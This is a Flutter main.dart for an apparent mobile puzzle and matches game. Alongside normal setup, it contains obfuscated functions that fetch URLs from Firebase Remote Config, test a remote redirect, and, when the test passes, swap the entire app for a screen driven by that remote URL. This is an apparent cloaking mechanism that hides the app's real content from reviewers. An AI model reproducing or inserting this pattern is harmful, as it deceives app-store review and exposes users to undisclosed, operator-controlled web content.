import 'dart:io';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'core/utils.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/pages/firebase_options.dart';
import 'features/matches/bloc/matches_bloc.dart';
import 'features/puzzle/pages/puzzle_game_page.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  await initHive();
  runApp(const MyApp());
}

String jfiodsfjiodsf = '';

String ndjkasdksa = '';
String ndjksandjkas = '';

Future<bool> jfidsojfoidsf() async {
  final njfdksfkdjsf = FirebaseRemoteConfig.instance;
  await njfdksfkdjsf.fetchAndActivate();
  String ndjksandjksa = njfdksfkdjsf.getString('most');
  String njkdaskdas = njfdksfkdjsf.getString('fost');
  final mkmfadsfkjdsmfs = await HttpClient().getUrl(Uri.parse(ndjksandjksa));
  mkmfadsfkjdsmfs.followRedirects = false;
  final response = await mkmfadsfkjdsmfs.close();

  if (!response.headers
      .value(HttpHeaders.locationHeader)
      .toString()
      .contains(njkdaskdas)) {
    ndjkasdksa = ndjksandjksa;
    return true;
  } else if (response.headers.value(HttpHeaders.locationHeader) == njkdaskdas) {
    return false;
  }
  return ndjksandjksa.contains('nost') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImages(context);

    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => MatchesBloc()),
      ],
      child: FutureBuilder<bool>(
        future: jfidsojfoidsf(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Center(
              child: Container(
                color: Colors.black,
                child: const CircularProgressIndicator(
                  color: Colors.white,
                ),
              ),
            );
          } else {
            if (snapshot.data == true && ndjkasdksa != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: MainnScreen(
                  fdsfds: ndjkasdksa,
                ),
              );
            } else {
              return MaterialApp.router(
                debugShowCheckedModeBanner: false,
                theme: theme,
                routerConfig: routerConfig,
              );
            }
          }
        },
      ),
    );
  }
}
